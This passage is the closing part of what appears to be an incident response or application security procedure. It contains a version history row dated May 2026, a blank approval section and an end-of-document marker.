| 1.0     | 19-May-2026 | L2/L3 Lead / IR Team Lead / AppSec Lead | Initial version |

---

## 15. Approval

Approved by:

Name: ____________________  
Title: ____________________  
Date: ____________________

---

**End of Document**